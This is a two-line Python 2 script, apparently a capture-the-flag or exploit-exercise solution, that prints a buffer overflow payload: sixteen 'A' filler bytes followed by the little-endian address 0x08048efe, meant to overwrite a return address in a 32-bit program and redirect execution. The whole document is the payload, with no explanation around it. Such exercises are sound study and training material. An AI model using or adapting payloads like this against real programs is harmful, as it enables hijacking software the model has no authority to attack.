from struct import pack

print "A"*(16) + pack("<I", 0x08048efe)
